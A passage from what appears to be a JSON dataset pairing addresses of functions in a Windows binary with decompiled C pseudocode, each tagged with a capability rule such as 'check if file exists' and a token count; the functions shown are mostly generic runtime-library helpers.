        ],
        "decompiled_code": "\nvoid __cdecl fcn.004024b9(int32_t noname_0, uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar auStack20 [4];\n    uint var_ch;\n    uint uStack12;\n    \n    do {\n        uStack12 = 0x45d86f;\n        iVar2 = fcn.0040159b();\n        if (iVar2 != 0) {\n            return;\n        }\n        uStack12 = 0x45d862;\n        iVar2 = fcn.004040de(noname_0);\n    } while (iVar2 != 0);\n    if (noname_0 != -1) {\n        fcn.00404462();\n        fcn.004066d1(&stack0xffffffec, 0x567380);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.00401aa0();\n    fcn.004066d1(&stack0xffffffec, 0x560c44);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 251
    },
    "00402784": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402784(void)\n\n{\n    if (*0x56ccd0 != -1) {\n        fcn.00402c20(*0x56ccd0);\n        *0x56ccd0 = -1;\n    }\n    return 1;\n}\n",
        "token_count": 58
    },
    "004029af": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004029af(char *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x004dacef:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = '\\0';\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    pcVar4 = arg_8h;\n                    iVar5 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            cVar1 = pcVar4[arg_10h - arg_8h];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if (cVar1 == '\\0') break;\n                            iVar5 = iVar5 + -1;\n                        } while (iVar5 != 0);\n                    }\n                    else {\n                        do {\n                            cVar1 = pcVar4[arg_10h - arg_8h];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if ((cVar1 == '\\0') || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *pcVar4 = '\\0';\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = '\\0';\n                        return 0x50;\n                    }\n                    *arg_8h = '\\0';\n                    puVar2 = fcn.004039a4();\n                    uVar6 = 0x22;\n                    goto code_r0x004dacdd;\n                }\n                *arg_8h = '\\0';\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x004dacef;\n    puVar2 = fcn.004039a4();\n    uVar6 = 0x16;\ncode_r0x004dacdd:\n    *puVar2 = uVar6;\n    fcn.00403751();\n    return uVar6;\n}\n",
        "token_count": 611
    },
    "0047a185": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0047a185(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t *arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    *arg_14h = arg_ch;\n    *arg_20h = arg_18h;\n    while( true ) {\n        iVar1 = *arg_14h;\n        if (iVar1 == arg_10h) {\n            return 0;\n        }\n        if ((arg_18h == arg_1ch) ||\n           (iVar1 = fcn.00403cdd(arg_18h, iVar1, arg_10h - iVar1, &var_8h, in_ECX + 8),  iVar1 == -2)) break;\n        if (iVar1 == -1) {\n            return 2;\n        }\n        if (iVar1 == 0) {\n            iVar1 = 1;\n        }\n        *arg_14h = *arg_14h + iVar1;\n        *arg_20h = *arg_20h + 2;\n        arg_18h = *arg_20h;\n    }\n    return 1;\n}\n",
        "token_count": 325
    },
    "00402d4c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402d4c(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    arg_8h_00 = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.004064c4(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x55055c;\n            param_1[0xd] = 0x55055c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403e18(arg_8h_00, arg_8h);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 349
    },
    "00402ee1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00402ee1(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    cVar1 = fcn.00402ea0(param_1 + 0xd);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00404278();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = param_1[10];\n            if (arg_8h_00 == -1) {\n                arg_8h_00 = 0x7fffffff;\n            }\n            arg_8h = param_1[0xd];\n            cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == 0) {\n                    param_1[0xd] = \"(null)\";\n                }\n                uVar2 = fcn.004037e2(arg_8h_00);\n            }\n            else {\n                if (arg_8h == 0) {\n                    arg_8h = 0x55055c;\n                    param_1[0xd] = 0x55055c;\n                }\n                *(param_1 + 0xf) = 1;\n                uVar2 = fcn.00403e18(arg_8h, arg_8h_00);\n            }\n            param_1[0xe] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 378
    },
    "00402f27": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402f27(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00404a6b(arg_8h, arg_ch);\n    return uVar1 & 0xffffff00 | uVar1 != 0xffffffff;\n}\n",
        "token_count": 74
    },
    "004032e7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004032e7(uchar *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040411f(arg_ch);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    *arg_8h = iVar1;\n    return 1;\n}\n",
        "token_count": 79
    },
    "00403409": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00403409(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f3e4;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00405d58(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f3e4 = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 422
    },
    "0040342c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040342c(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f348;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00402e05(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f348 = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 419
    },
    "00403611": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403611(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_ch = param_1[10];\n    arg_8h = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00403f3f(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x55055c;\n            param_1[0xd] = 0x55055c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403e18(arg_8h, arg_ch);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 333
    },
    "0047a0f8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0047a0f8(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t *arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    *arg_14h = arg_ch;\n    *arg_20h = arg_18h;\n    while( true ) {\n        iVar1 = *arg_14h;\n        if (iVar1 == arg_10h) {\n            return 0;\n        }\n        if ((arg_18h == arg_1ch) ||\n           (iVar1 = fcn.00403cdd(arg_18h, iVar1, arg_10h - iVar1, &var_8h, in_ECX + 8),  iVar1 == -2)) break;\n        if (iVar1 == -1) {\n            return 2;\n        }\n        if (iVar1 == 0) {\n            iVar1 = 1;\n        }\n        *arg_14h = *arg_14h + iVar1;\n        *arg_20h = *arg_20h + 2;\n        arg_18h = *arg_20h;\n    }\n    return 1;\n}\n",
        "token_count": 327
    },
    "00403b1b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403b1b(uint *arg_8h, uint arg_ch, int32_t arg_10h, uint noname_3, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t var_4h;\n    \n    uVar1 = *(arg_18h + 0xc);\n    uVar4 = uVar1;\n    uVar5 = uVar1;\n    if (-1 < arg_1ch) {\n        piVar3 = uVar1 * 0x14 + *(arg_18h + 0x10) + 8;\n        var_4h = uVar1;\n        do {\n            if (uVar4 == 0xffffffff) goto code_r0x0048478b;\n            uVar4 = uVar4 - 1;\n            if (((piVar3[-6] < arg_10h) && (arg_10h <= piVar3[-5])) || (uVar4 == 0xffffffff)) {\n                arg_1ch = arg_1ch + -1;\n                uVar5 = var_4h;\n                var_4h = uVar4;\n            }\n            piVar3 = piVar3 + -5;\n        } while (-1 < arg_1ch);\n    }\n    if ((uVar5 <= uVar1) && (uVar4 + 1 <= uVar5)) {\n        arg_8h[3] = uVar5;\n        *arg_8h = arg_ch;\n        arg_8h[1] = uVar4 + 1;\n        arg_8h[2] = arg_ch;\n        return;\n    }\ncode_r0x0048478b:\n    fcn.00404e94();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 442
    },
    "00403b3e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00403b3e(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = arg_10h;\n    uVar5 = arg_ch;\n    if ((-1 < arg_10h) && ((0 < arg_10h || (arg_ch != 0)))) {\n        do {\n            if (*in_ECX[8] == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = *in_ECX[0xc];\n            }\n            var_8h = uVar4 >> 0x1f;\n            if ((var_8h < 0) || ((-1 < uVar4 || var_8h < 0 && (uVar4 == 0)))) {\n                pcVar1 = *(*in_ECX + 0xc);\n                (**0x573000)(*arg_8h);\n                iVar2 = (*pcVar1)();\n                if (iVar2 == -1) break;\n                bVar6 = uVar5 != 0;\n                uVar5 = uVar5 - 1;\n                iVar3 = iVar3 + -1 + bVar6;\n                uVar4 = 1;\n            }\n            else {\n                if ((iVar3 <= var_8h) && ((iVar3 < var_8h || (uVar5 < uVar4)))) {\n                    uVar4 = uVar5;\n                    var_8h = iVar3;\n                }\n                fcn.0040576d(*in_ECX[8], arg_8h, uVar4);\n                bVar6 = uVar5 < uVar4;\n                uVar5 = uVar5 - uVar4;\n                iVar3 = (iVar3 - var_8h) - bVar6;\n                *in_ECX[0xc] = *in_ECX[0xc] - uVar4;\n                *in_ECX[8] = *in_ECX[8] + uVar4;\n            }\n            arg_8h = arg_8h + uVar4;\n            if ((iVar3 < 1) && ((iVar3 < 0 || (uVar5 == 0)))) break;\n        } while( true );\n    }\n    return CONCAT44((arg_10h - iVar3) - (arg_ch < uVar5), arg_ch - uVar5);\n}\n",
        "token_count": 608
    },
    "00403be3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00403be3(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    cVar1 = fcn.00406884(param_1 + 0xd);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.004058f8();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = param_1[10];\n            if (arg_8h_00 == -1) {\n                arg_8h_00 = 0x7fffffff;\n            }\n            arg_8h = param_1[0xd];\n            cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == 0) {\n                    param_1[0xd] = \"(null)\";\n                }\n                uVar2 = fcn.00403986(arg_8h_00);\n            }\n            else {\n                if (arg_8h == 0) {\n                    arg_8h = 0x55055c;\n                    param_1[0xd] = 0x55055c;\n                }\n                *(param_1 + 0xf) = 1;\n                uVar2 = fcn.00403e18(arg_8h, arg_8h_00);\n            }\n            param_1[0xe] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 377
    },
    "00403c5b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00403c5b(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t arg_8h;\n    \n    if (*0x56ccd0 == -1) {\n        return 0;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    iVar2 = fcn.004040fc(*0x56ccd0);\n    if (iVar2 == -1) {\ncode_r0x00487a35:\n        iVar2 = 0;\n        goto code_r0x00487a7b;\n    }\n    if (iVar2 != 0) goto code_r0x00487a7b;\n    iVar2 = fcn.004016a4(*0x56ccd0, 0xffffffff);\n    if (iVar2 == 0) goto code_r0x00487a35;\n    arg_ch = fcn.00403387(1, 0x28);\n    if (arg_ch == 0) {\ncode_r0x00487a5d:\n        fcn.004016a4(*0x56ccd0, 0);\n        iVar2 = 0;\n        arg_8h = arg_ch;\n    }\n    else {\n        iVar2 = fcn.004016a4(*0x56ccd0, arg_ch);\n        if (iVar2 == 0) goto code_r0x00487a5d;\n        arg_8h = 0;\n        iVar2 = arg_ch;\n    }\n    fcn.004040d9(arg_8h);\ncode_r0x00487a7b:\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n    return iVar2;\n}\n",
        "token_count": 380
    },
    "00403cd3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403cd3(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (0 < arg_10h) {\n        do {\n            cVar1 = fcn.00405d21(arg_ch);\n            if (cVar1 == '\\0') {\n                *arg_14h = -1;\n                iVar2 = -1;\n            }\n            else {\n                *arg_14h = *arg_14h + 1;\n                iVar2 = *arg_14h;\n            }\n        } while ((iVar2 != -1) && (iVar3 = iVar3 + 1,  iVar3 < arg_10h));\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00403d87": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00403d87(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f37c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.004064b0(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f37c = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 421
    },
    "00403ebd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00403ebd(void)\n\n{\n    if (*0x56ce70 != -1) {\n        fcn.004016f4(*0x56ce70);\n        *0x56ce70 = -1;\n    }\n    return 1;\n}\n",
        "token_count": 59
    },
    "00403f2b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403f2b(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t unaff_EBX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_10h) {\n        do {\n            fcn.004016ae(unaff_EBX & 0xffff0000 | arg_ch, arg_14h);\n            if (*arg_14h == -1) {\n                return;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00403f3a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403f3a(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_ch = param_1[10];\n    arg_8h = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00403f3f(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x55055c;\n            param_1[0xd] = 0x55055c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403e18(arg_8h, arg_ch);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 335
    },
    "00403f9e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403f9e(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_10h) {\n        do {\n            fcn.00403d5f(arg_ch, arg_14h);\n            if (*arg_14h == -1) {\n                return;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00403fd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00403fd0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f368;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0040605a(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f368 = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 419
    },
    "00404183": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404183(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (*0x56ec24 == -1) {\n        iVar1 = fcn.00402923(arg_8h);\n    }\n    else {\n        iVar1 = fcn.0040119a(0x56ec24, arg_8h);\n    }\n    return ~-(iVar1 != 0) & arg_8h;\n}\n",
        "token_count": 104
    },
    "00404331": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.00404331(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint arg_8h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((*0x56ce70 == -1) || (uVar3 = fcn.004037b0(*0x56ce70),  uVar3 == 0)) {\n        iVar4 = fcn.004018b1(*0x56ce70, 0xffffffff);\n        if (iVar4 != 0) {\n            uVar3 = fcn.00404fd9(1, 0x364);\n            if (uVar3 == 0) {\n                fcn.004018b1(*0x56ce70, 0);\n                arg_8h = 0;\n            }\n            else {\n                iVar4 = fcn.004018b1(*0x56ce70, uVar3);\n                if (iVar4 != 0) {\n                    fcn.004c0657(uVar3, 0x570218);\n                    fcn.00406302(0);\n                    goto code_r0x004c0b5b;\n                }\n                arg_8h = 0;\n                fcn.004018b1(*0x56ce70, 0);\n            }\n            fcn.00406302(arg_8h);\n        }\n    }\n    else if (uVar3 != 0xffffffff) goto code_r0x004c0b5b;\n    uVar3 = 0;\ncode_r0x004c0b5b:\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n    uVar3 = -(uVar3 != 0) & uVar3;\n    if (uVar3 == 0) {\n        fcn.00404e94();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    return uVar3;\n}\n",
        "token_count": 453
    },
    "00404372": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * fcn.00404372(uint *param_1, uint param_2)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    if (*(*(*(in_FS_OFFSET + 0x2c) + *0x56ebe4 * 4) + 0x104) < *0x56ebc8) {\n        fcn.00405d03(0x56ebc8);\n        if (*0x56ebc8 == -1) {\n            fcn.00403de6(0x414770);\n            fcn.00405d94(0x56ebc8);\n        }\n    }\n    *param_1 = param_2;\n    param_1[1] = 0x56ca48;\n    return param_1;\n}\n",
        "token_count": 169
    },
    "004043f4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004043f4(uint32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        if (arg_10h != 0) goto code_r0x004d27c5;\n    }\n    else if (arg_10h == 0) {\ncode_r0x004d27c5:\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0x16;\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = 0;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = 0;\n    }\n    uVar3 = arg_10h;\n    if (arg_18h <= arg_10h) {\n        uVar3 = arg_18h;\n    }\n    if (uVar3 < 0x80000000) {\n        iVar2 = fcn.004d23e5(arg_ch, arg_14h, uVar3, arg_1ch);\n        if (iVar2 == -1) {\n            if (arg_ch != NULL) {\n                *arg_ch = 0;\n            }\n            puVar1 = fcn.004039a4();\n            return *puVar1;\n        }\n        uVar3 = iVar2 + 1;\n        if (arg_ch == NULL) {\n            uVar4 = 0;\n        